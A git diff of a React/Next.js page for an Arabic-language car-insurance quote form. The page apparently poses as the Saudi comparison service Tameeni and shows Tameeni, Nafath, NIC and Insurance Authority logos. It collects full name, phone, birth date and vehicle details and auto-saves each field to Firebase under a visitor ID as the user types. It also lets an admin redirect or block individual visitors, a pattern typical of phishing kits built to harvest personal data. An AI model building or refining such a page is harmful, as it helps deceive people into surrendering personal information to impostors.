@@ -2,195 +2,213 @@
 
 import { useEffect, useState } from "react"
 import { useRouter } from "next/navigation"
-import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { Globe } from 'lucide-react'
+import {
+  User, Phone, Calendar, Car, Tag, Wrench,
+  Settings2, ShieldCheck, Search, Loader2, RefreshCw,
+} from 'lucide-react'
 import { FullPageLoader } from "@/components/loader"
 import { StepShell } from "@/components/step-shell"
 import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { addData } from "@/lib/firebase"
-import { translations } from "@/lib/translations"
 import { getSelectedVehicle } from "@/lib/vehicle-api"
+
+function generateCaptcha() {
+  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 10)).join(" ")
+}
+const CAPTCHA_COLORS = ["#e53935", "#1976d2", "#388e3c", "#f57c00"]
+
+const FIELD_CLASS =
+  "w-full h-12 text-right text-sm border border-gray-200 rounded-xl px-4 bg-white focus:border-[#1976d2] focus:outline-none transition-all text-gray-800 font-medium"
+
+function FieldLabel({ icon, children }: { icon: React.ReactNode; children: React.ReactNode }) {
+  return (
+    <label className="flex items-center justify-end gap-2 text-sm font-bold text-gray-700 mb-1.5">
+      {children}
+      <span className="text-[#1976d2]">{icon}</span>
+    </label>
+  )
+}
 
 export default function InsurancePage() {
   const router = useRouter()
   const [visitorID] = useState(() => getOrCreateVisitorID())
   const [loading, setLoading] = useState(true)
   const [isBlocked, setIsBlocked] = useState(false)
-  
+  const [submitting, setSubmitting] = useState(false)
+
   // Form fields
-  const [insuranceCoverage, setInsuranceCoverage] = useState("")
+  const [fullName, setFullName] = useState("")
+  const [phoneNumber, setPhoneNumber] = useState("")
+  const [birthDate, setBirthDate] = useState("")
+  const [insuranceCoverage, setInsuranceCoverage] = useState("comprehensive")
   const [insuranceStartDate, setInsuranceStartDate] = useState("")
   const [vehicleUsage, setVehicleUsage] = useState("")
   const [vehicleValue, setVehicleValue] = useState("")
   const [vehicleYear, setVehicleYear] = useState("")
   const [vehicleModel, setVehicleModel] = useState("")
   const [repairLocation, setRepairLocation] = useState("agency")
-  
-  // Language
-  const [language, setLanguage] = useState<"ar" | "en">("ar")
-  
-  // Auto-save all form data
+
+  // Captcha
+  const [captchaText, setCaptchaText] = useState("3 5 1 9")
+  const [captchaInput, setCaptchaInput] = useState("")
+  const [captchaError, setCaptchaError] = useState(false)
+
+  useEffect(() => {
+    setCaptchaText(generateCaptcha())
+    // Pre-fill start date with today
+    const today = new Date().toISOString().split("T")[0]
+    setInsuranceStartDate(today)
+    // Pre-fill name/phone from home step
+    try {
+      const hfd = JSON.parse(localStorage.getItem("homeFormData") || "{}")
+      if (hfd.ownerName) setFullName(hfd.ownerName)
+      if (hfd.phoneNumber) setPhoneNumber(hfd.phoneNumber)
+    } catch { /* ignore */ }
+  }, [])
+
   useAutoSave({
     visitorId: visitorID,
     pageName: "insur",
-    data: {
-      insuranceCoverage,
-      insuranceStartDate,
-      vehicleUsage,
-      vehicleValue,
-      vehicleYear,
-      vehicleModel,
-      repairLocation
-    }
+    data: { fullName, phoneNumber, birthDate, insuranceCoverage, insuranceStartDate, vehicleUsage, vehicleValue, vehicleYear, vehicleModel, repairLocation },
   })
-  
-  // Monitor redirect requests from admin
-  useRedirectMonitor({
-    visitorId: visitorID,
-    currentPage: "insur"
-  })
-  
-  // Initialize on mount
+
+  useRedirectMonitor({ visitorId: visitorID, currentPage: "insur" })
+
   useEffect(() => {
     const init = async () => {
       const blocked = await checkIfBlocked(visitorID)
-      if (blocked) {
-        setIsBlocked(true)
-        setLoading(false)
-        return
-      }
-      
+      if (blocked) { setIsBlocked(true); setLoading(false); return }
       setLoading(false)
     }
-    
     init()
   }, [visitorID])
-  
-  // Auto-fill vehicle data from car-bot
+
   useEffect(() => {
     const vehicleData = getSelectedVehicle()
     if (vehicleData) {
-      // تعبئة سنة الصنع والموديل تلقائياً
       setVehicleYear(vehicleData.year.toString())
       setVehicleModel(`${vehicleData.maker} ${vehicleData.model}`)
-      console.log('✅ Auto-filled vehicle data:', vehicleData)
     }
   }, [])
-  
-  // Handle vehicle value input - numbers only
+
   const handleVehicleValueChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/[^0-9]/g, '') // Remove non-numeric characters
-    setVehicleValue(value) // Allow any numeric input, validation happens on submit
+    setVehicleValue(e.target.value.replace(/[^0-9]/g, ""))
   }
-  
-  // Handle form submit
-  const handleSecondStepSubmit = async (e: React.FormEvent) => {
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    
-    // Validate vehicle value
     const valueNum = parseInt(vehicleValue)
     if (valueNum < 10000 || valueNum > 1000000) {
-      alert('قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال')
+      alert("قيمة المركبة يجب أن تكون بين 10,000 و 1,000,000 ريال")
       return
     }
-    
+    const captchaClean = captchaText.replace(/\s/g, "")
+    if (captchaInput !== captchaClean) { setCaptchaError(true); return }
+    setSubmitting(true)
     await addData({
       id: visitorID,
-      insuranceCoverage,
-      insuranceStartDate,
-      vehicleUsage,
-      vehicleValue,
-      vehicleYear,
-      vehicleModel,
+      fullName, phoneNumber, birthDate,
+      insuranceCoverage, insuranceStartDate,
+      vehicleUsage, vehicleValue, vehicleYear, vehicleModel,
       repairLocation,
       currentStep: 3,
       currentPage: "compar",
-      insurCompletedAt: new Date().toISOString()
-    }).then(() => {
-      // Navigate immediately
-      router.push('/compar')
+      insurCompletedAt: new Date().toISOString(),
     })
+    router.push("/compar")
   }
-  
-  if (loading) {
-    return <FullPageLoader />
-  }
-  
+
+  if (loading) return <FullPageLoader />
+
   if (isBlocked) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-gray-50">
         <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
           <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
           <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
-          <p className="text-gray-600 mt-2">للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.</p>
         </div>
       </div>
     )
   }
-  
-  // Generate years from 2000 to 2026
-  const years = Array.from({ length: 27 }, (_, i) => 2026 - i) // 2026 down to 2000
-  
+
+  const years = Array.from({ length: 27 }, (_, i) => 2026 - i)
+
   return (
     <StepShell
-      step={1}
+      step={2}
       title="بيانات التأمين"
-      subtitle="أكمل معلومات التأمين والمركبة للانتقال للعروض."
-      maxWidthClassName="max-w-3xl"
-      headerAction={
-        <button 
-          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
-          className="flex items-center gap-2 rounded-lg border border-[#bbdefb] bg-[#e3f2fd] px-3 py-2 text-sm font-bold text-[#1976d2]"
-        >
-          <Globe className="h-4 w-4 text-[#1976d2]" />
-          <span>{language === "ar" ? "EN" : "AR"}</span>
-        </button>
-      }
+      icon={<User className="w-5 h-5" />}
+      maxWidthClassName="max-w-md"
     >
-      <form onSubmit={handleSecondStepSubmit} className="space-y-4 md:space-y-5" dir={language === "ar" ? "rtl" : "ltr"}>
-        <div className="space-y-1.5">
-          <label className="block text-slate-700 font-bold text-sm md:text-base">نوع التأمين</label>
-          <select
-            value={insuranceCoverage}
-            onChange={(e) => setInsuranceCoverage(e.target.value)}
-            className="w-full h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl px-3 md:px-4 bg-white focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 focus:outline-none transition-all appearance-none cursor-pointer text-gray-900 font-medium"
-            required
-          >
-            <option value="">إختر</option>
-            <option value="comprehensive">شامل</option>
-            <option value="third-party">ضد الغير</option>
-          </select>
-        </div>
+      <form onSubmit={handleSubmit} className="space-y-4" dir="rtl">
 
-        <div className="space-y-1.5">
-          <label className="block text-slate-700 font-bold text-sm md:text-base">تاريخ بدء التأمين</label>
-          <input
-            type="date"
-            value={insuranceStartDate}
-            onChange={(e) => setInsuranceStartDate(e.target.value)}
-            className="w-full h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl px-3 md:px-4 bg-white focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 focus:outline-none transition-all cursor-pointer text-gray-900 font-medium"
-            style={{
-              colorScheme: 'light',
-              direction: 'rtl'
-            }}
+        {/* Full name */}
+        <div>
+          <FieldLabel icon={<User className="w-4 h-4" />}>الاسم الكامل</FieldLabel>
+          <Input
+            placeholder="أدخل الاسم الكامل"
+            value={fullName}
+            onChange={(e) => setFullName(e.target.value)}
+            maxLength={50}
+            className={FIELD_CLASS}
+            dir="rtl"
             required
           />
         </div>
 
-        <div className="space-y-1.5">
-          <label className="block text-slate-700 font-bold text-sm md:text-base">
-            الغرض من استخدام المركبة
-          </label>
+        {/* Phone */}
+        <div>
+          <FieldLabel icon={<Phone className="w-4 h-4" />}>رقم الهاتف</FieldLabel>
+          <Input
+            type="tel"
+            inputMode="numeric"
+            placeholder="05XXXXXXXX"
+            value={phoneNumber}
+            onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, "").slice(0, 10))}
+            className={FIELD_CLASS}
+            dir="ltr"
+            required
+          />
+        </div>
+
+        {/* Birth date */}
+        <div>
+          <FieldLabel icon={<Calendar className="w-4 h-4" />}>تاريخ الميلاد</FieldLabel>
+          <input
+            type="date"
+            value={birthDate}
+            onChange={(e) => setBirthDate(e.target.value)}
+            className={FIELD_CLASS}
+            style={{ colorScheme: "light" }}
+          />
+        </div>
+
+        {/* Policy start date */}
+        <div>
+          <FieldLabel icon={<Calendar className="w-4 h-4" />}>تاريخ بدء الوثيقة</FieldLabel>
+          <input
+            type="date"
+            value={insuranceStartDate}
+            onChange={(e) => setInsuranceStartDate(e.target.value)}
+            className={FIELD_CLASS}
+            style={{ colorScheme: "light" }}
+            required
+          />
+        </div>
+
+        {/* Vehicle usage */}
+        <div>
+          <FieldLabel icon={<Car className="w-4 h-4" />}>الغرض من استخدام المركبة</FieldLabel>
           <select
             value={vehicleUsage}
             onChange={(e) => setVehicleUsage(e.target.value)}
-            className="w-full h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl px-3 md:px-4 bg-white focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 focus:outline-none transition-all appearance-none cursor-pointer text-gray-900 font-medium"
+            className={`${FIELD_CLASS} appearance-none cursor-pointer`}
             required
           >
-            <option value="">إختر</option>
+            <option value="">اختر</option>
             <option value="personal">شخصي</option>
             <option value="commercial">تجاري</option>
             <option value="passenger-transport">نقل ركاب</option>
@@ -201,93 +219,127 @@ export default function InsurancePage() {
           </select>
         </div>
 
-        <div className="space-y-1.5">
-          <label className="block text-slate-700 font-bold text-sm md:text-base">
-            القيمة التقديرية للمركبة
-          </label>
+        {/* Vehicle value */}
+        <div>
+          <FieldLabel icon={<Tag className="w-4 h-4" />}>القيمة التقديرية للمركبة</FieldLabel>
           <Input
             type="tel"
             inputMode="numeric"
-            pattern="[0-9]*"
-            placeholder="أدخل القيمة بين 10,000 - 1,000,000 ريال"
+            placeholder="أدخل القيمة التقديرية"
             value={vehicleValue}
             onChange={handleVehicleValueChange}
-            className="h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 transition-all text-gray-900 font-medium"
+            className={FIELD_CLASS}
             dir="rtl"
             required
-            min="10000"
-            max="1000000"
           />
-          <p className="text-xs text-slate-500 text-right">القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال</p>
+          {vehicleValue && (parseInt(vehicleValue) < 10000 || parseInt(vehicleValue) > 1000000) && (
+            <p className="text-xs text-red-500 mt-1 text-right">القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال</p>
+          )}
         </div>
 
-        <div className="space-y-1.5">
-          <label className="block text-slate-700 font-bold text-sm md:text-base">سنة صنع المركبة</label>
+        {/* Vehicle year */}
+        <div>
+          <FieldLabel icon={<Wrench className="w-4 h-4" />}>سنة الصنع</FieldLabel>
           <select
             value={vehicleYear}
             onChange={(e) => setVehicleYear(e.target.value)}
-            className="w-full h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl px-3 md:px-4 bg-white focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 focus:outline-none transition-all appearance-none cursor-pointer text-gray-900 font-medium"
+            className={`${FIELD_CLASS} appearance-none cursor-pointer`}
             required
           >
-            <option value="">إختر</option>
+            <option value="">اختر</option>
             {years.map((year) => (
-              <option key={year} value={year}>
-                {year}
-              </option>
+              <option key={year} value={year}>{year}</option>
             ))}
           </select>
         </div>
 
-        <div className="space-y-1.5">
-          <label className="block text-slate-700 font-bold text-sm md:text-base">ماركة وموديل السيارة</label>
-          <Input
-            placeholder="مثال: تويوتا كامري 2023"
-            value={vehicleModel}
-            onChange={(e) => setVehicleModel(e.target.value)}
-            maxLength={40}
-            className="h-11 md:h-12 text-right text-sm md:text-base border border-slate-300 rounded-xl focus:border-[#1976d2] focus:ring-2 focus:ring-[#1976d2]/10 transition-all text-gray-900 font-medium"
-            dir="rtl"
-            required
-          />
-        </div>
-
-        <div className="space-y-1.5">
-          <label className="block text-slate-700 font-bold text-sm md:text-base">مكان اصلاح المركبة</label>
-          <div className="space-y-2 md:space-y-2.5">
+        {/* Repair location — pill buttons */}
+        <div>
+          <FieldLabel icon={<Settings2 className="w-4 h-4" />}>مكان الإصلاح</FieldLabel>
+          <div className="grid grid-cols-2 gap-2">
             {[
-              { value: "agency", label: "الوكالة" },
-              { value: "workshop", label: "الورشة" },
-            ].map((opt) => (
-              <label
-                key={opt.value}
-                className={`flex items-center gap-2 md:gap-3 p-3 md:p-3.5 border-2 rounded-xl cursor-pointer transition-all ${
-                  repairLocation === opt.value
-                    ? "border-[#1976d2] bg-[#e3f2fd]/50 shadow-sm"
-                    : "border-slate-200 hover:border-slate-300 bg-white"
+              { value: "workshop", label: "الورشة", icon: "🔧" },
+              { value: "agency", label: "الوكالة", icon: "🏢" },
+            ].map(({ value, label, icon }) => (
+              <button
+                key={value}
+                type="button"
+                onClick={() => setRepairLocation(value)}
+                className={`h-12 rounded-xl text-sm font-bold border-2 transition-all flex items-center justify-center gap-2 ${
+                  repairLocation === value
+                    ? "border-[#1976d2] bg-[#1976d2] text-white"
+                    : "border-gray-200 text-gray-600 bg-white hover:border-[#1976d2]/50"
                 }`}
               >
-                <input
-                  type="radio"
-                  name="repairLocation"
-                  value={opt.value}
-                  checked={repairLocation === opt.value}
-                  onChange={(e) => setRepairLocation(e.target.value)}
-                  className="w-4 h-4 md:w-5 md:h-5 text-[#1976d2] focus:ring-[#1976d2]"
-                />
-                <span className="text-sm md:text-base font-semibold">{opt.label}</span>
-              </label>
+                <span>{icon}</span>
+                {label}
+              </button>
             ))}
           </div>
         </div>
 
-        <Button
+        {/* Captcha */}
+        <div>
+          <div className="flex items-center justify-between mb-1.5">
+            <button type="button" onClick={() => { setCaptchaText(generateCaptcha()); setCaptchaInput(""); setCaptchaError(false); }} className="text-[#1976d2]">
+              <RefreshCw className="w-4 h-4" />
+            </button>
+            <label className="flex items-center gap-2 text-sm font-bold text-gray-700">
+              رمز التحقق
+              <ShieldCheck className="w-4 h-4 text-[#1976d2]" />
+            </label>
+          </div>
+          <div className="flex gap-2 items-stretch">
+            <Input
+              type="tel"
+              inputMode="numeric"
+              placeholder="أدخل رمز التحقق"
+              value={captchaInput}
+              onChange={(e) => { setCaptchaInput(e.target.value.replace(/\D/g, "").slice(0, 4)); setCaptchaError(false); }}
+              className={`h-12 rounded-xl border text-sm text-center flex-1 ${captchaError ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-[#1976d2]"}`}
+              dir="ltr"
+              required
+            />
+            <div className="h-12 px-4 flex items-center justify-center rounded-xl border-2 border-dashed border-gray-300 bg-gray-50 gap-1.5 select-none min-w-[90px]">
+              {captchaText.split(" ").map((digit, i) => (
+                <span key={i} className="text-xl font-black" style={{ color: CAPTCHA_COLORS[i % CAPTCHA_COLORS.length], fontFamily: "monospace" }}>
+                  {digit}
+                </span>
+              ))}
+            </div>
+          </div>
+          {captchaError && <p className="text-xs text-red-600 mt-1 text-right">⚠ رمز التحقق غير صحيح</p>}
+        </div>
+
+        {/* Submit */}
+        <button
           type="submit"
-          className="w-full h-12 md:h-14 bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-base md:text-lg rounded-xl shadow-[0_4px_16px_rgba(25,118,210,0.3)] hover:shadow-[0_6px_24px_rgba(25,118,210,0.4)] transition-all"
+          disabled={submitting}
+          className="w-full h-13 py-3.5 rounded-xl bg-[#8c9eb5] hover:bg-[#7a8fa5] text-white font-bold text-base transition-all disabled:opacity-70 flex items-center justify-center gap-2"
         >
+          {submitting ? <Loader2 className="w-5 h-5 animate-spin" /> : <Search className="w-5 h-5" />}
           إظهار العروض
-        </Button>
+        </button>
+
+        {/* Disclaimer */}
+        <p className="text-[11px] text-gray-500 leading-relaxed text-right">
+          بالضغط على «إظهار العروض» فأنت توافق على منح شركة تأميني الحق في الاستعلام من وزارة التجارة و/أو مركز المعلومات الوطني عن بياناتي
+        </p>
+
       </form>
+
+      {/* Partner logos */}
+      <div className="mt-5 pt-4 border-t border-gray-100">
+        <div className="flex items-center justify-center gap-4 flex-wrap">
+          <img src="/tameeni-logo.webp" alt="تأميني" className="h-7 w-7 rounded-lg opacity-70" />
+          <img src="/NIC-logo.png" alt="NIC" className="h-6 object-contain opacity-60" />
+          <img src="/nafad-logo-new.png" alt="نافذ" className="h-6 object-contain opacity-60" />
+          <div className="flex items-center gap-1">
+            <span className="text-[10px] font-bold text-gray-400">IA</span>
+            <span className="text-[10px] text-gray-400">Insurance Authority</span>
+          </div>
+        </div>
+      </div>
     </StepShell>
   )
 }
-
